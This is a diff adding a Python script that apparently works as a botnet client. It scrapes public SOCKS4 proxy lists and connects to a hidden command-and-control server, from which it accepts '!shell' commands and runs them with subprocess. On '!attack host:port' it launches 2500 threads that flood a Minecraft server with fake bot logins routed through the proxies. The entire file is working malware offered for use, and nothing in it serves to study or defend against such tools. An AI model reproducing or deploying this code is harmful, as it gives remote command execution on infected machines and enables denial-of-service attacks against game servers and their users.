@@ -1,0 +1,166 @@
+import socket, time, os, threading, subprocess, socks, random, string, sys, requests, re, urllib.request
+from bs4 import BeautifulSoup as BS
+from time import sleep
+from time import time
+
+how = 0
+
+def get_ip():
+    group = re.compile(u'(?P<ip>\d+\.\d+\.\d+\.\d+)').search(urllib.request.urlopen('http://jsonip.com/').read()).groupdict()
+    return group['ip']
+
+class utils:
+    def list_to_str_delimiter(args: list, delim: str) -> str:
+        return f'{delim}'.join([str(arg) for arg in args])
+    def get_size(bytes, suffix="B"):
+        """
+        Scale bytes to its proper format
+        e.g:
+            1253656 => '1.20MB'
+
+            1253656678 => '1.17GB'
+        """
+        factor = 1024
+        for unit in ["", "K", "M", "G", "T", "P"]:
+            if bytes < factor:
+                return f"{bytes:.2f}{unit}{suffix}"
+            bytes /= factor
+
+class proxy_:
+    proxies = list()
+    def getProxies():
+        return proxy_.proxies
+    def parseProxies():
+        HEADERS = {
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0'
+        }
+        abc = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+        lol = 0
+        r = requests.get(f'https://hidemy.name/ru/proxy-list/?type=4#list', headers=HEADERS)
+        soup = BS(r.content, 'html.parser')
+        proxies = soup.find('div', class_='table_block').find('tbody').find_all('tr')
+        for i in proxies:
+            _proxy = i.find('td')
+            _port = _proxy.find_next('td').text
+            _proxy = _proxy.text
+            proxy = _proxy + ':' + _port
+            if proxy in proxy_.proxies: continue
+            if lol == 0:
+                if proxy not in proxy_.proxies: proxy_.proxies.append(proxy)
+                lol = 1
+            else:
+                if proxy not in proxy_.proxies: proxy_.proxies.append(proxy)
+        while True:
+            try:
+                site = soup.find('li', class_='next_array').find('a').get('href')
+                r = requests.get(f'https://hidemy.name{site}', headers=HEADERS)
+                soup = BS(r.content, 'html.parser')
+                proxy_.proxies.append(soup.find('div', class_='table_block').find('tbody').find_all('tr'))
+            except Exception as e:
+                break
+        r = requests.get(f'https://github.com/TheSpeedX/PROXY-List/blob/master/proxies.txt', headers=HEADERS)
+        soup = BS(r.content, 'html.parser')
+
+        proxies = soup.find_all('tr')
+        for i in proxies:
+            proxy = i.text.split('\n')[2]
+            if proxy in proxy_.proxies: continue
+            proxy_.proxies.append(proxy)
+
+        r = requests.get(f'https://api.openproxylist.xyz/proxies.txt', headers=HEADERS)
+        soup = BS(r.content, 'html.parser')
+
+        proxies = str(r.content).split(f'\n')[0].split(f'\\n')
+        for i in proxies:
+            if i in proxy_.proxies: continue
+            if '<' in i: continue
+            lol = 0
+            for j in abc:
+                if j in i: lol = 1
+            if lol == 1: continue
+            proxy_.proxies.append(i)
+
+        r = requests.get(f'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4', headers=HEADERS)
+        soup = BS(r.content, 'html.parser')
+        proxies = str(r.content).split(f'\n')[0].split(f'\\n')
+        for i in proxies:
+            if i in proxy_.proxies: continue
+            if '<' in i: continue
+            lol = 0
+            for j in abc:
+                if j in i: lol = 1
+            if lol == 1: continue
+            proxy_.proxies.append(i)
+
+
+
+
+
+class attack:
+    def minecraft(host: str, port: int) -> None:
+        """Attacks minecraft server"""
+
+        global how
+        time.sleep( 2 )
+        while 1:
+            try:
+                usr = random.choice(string.ascii_uppercase) + str(random.randint(00000000, 99999999)) + random.choice(string.ascii_uppercase)
+                m = random.choice(proxy_.getProxies())
+                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+                print(m.split(":")[0] + "\n" +m.split(":")[1])
+                sock.setproxy(socks.PROXY_TYPE_SOCKS4, m.split(":")[0], int(m.split(":")[1]))
+                sock.connect((host, port))
+                sock.send(f'\x06\x00{str.encode(chr(47))}\x00\x00\x00\x02')
+                sock.send('\x0c\x00\n' + usr)
+                how += 1
+                sys.stdout.write('\r[%s / %s] joined!' % (how, usr))
+                time.sleep(1)
+                sock.close()
+            except Exception as err:
+                sock.close()
+                print('[%s / %s] errored %s' % (str(how), usr, err))
+class client:
+    def main():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)
+            s.connect(("hided", 27361))
+            client.handle(s)
+        except Exception as e:
+            sleep(5)
+            client.connect()
+    def connect():
+        client.main()
+    def handle(s):
+        r = requests.get("https://api.ipify.org/", stream=True)
+        myip = r.content
+        while True:
+            tmp = s.recv(1024).decode()
+            if len(tmp) == 0:
+                client.main()
+            if tmp.__contains__(myip):
+                # addr!shell echo "eblya"
+                print(tmp)
+                cmd = tmp.replace(myip + "!shell ", "")
+
+                def send(cmd: str) -> None:
+                    try: subprocess.Popen(cmd, shell=True)
+                    except: return
+                threading.Thread(target=send, args=[cmd,], daemon=True).start()
+            if tmp.__contains__("!shell"):
+                cmd = tmp.replace("!shell ", "")
+                def send(cmd: str) -> None:
+                    try: subprocess.Popen(cmd, shell=True)
+                    except: return
+                threading.Thread(target=send, args=[cmd,], daemon=True).start()
+            if tmp.__contains__("!attack"):
+                cmd = tmp.replace("!attack ", "")
+                proxy_.parseProxies()
+                def start() -> None:
+                    attack.minecraft(str(cmd).split(":")[0], int(str(cmd).split(":")[1]))
+                for i in range(2500):
+                    threading.Thread(target=start, daemon=True).start()
+
+client.main()
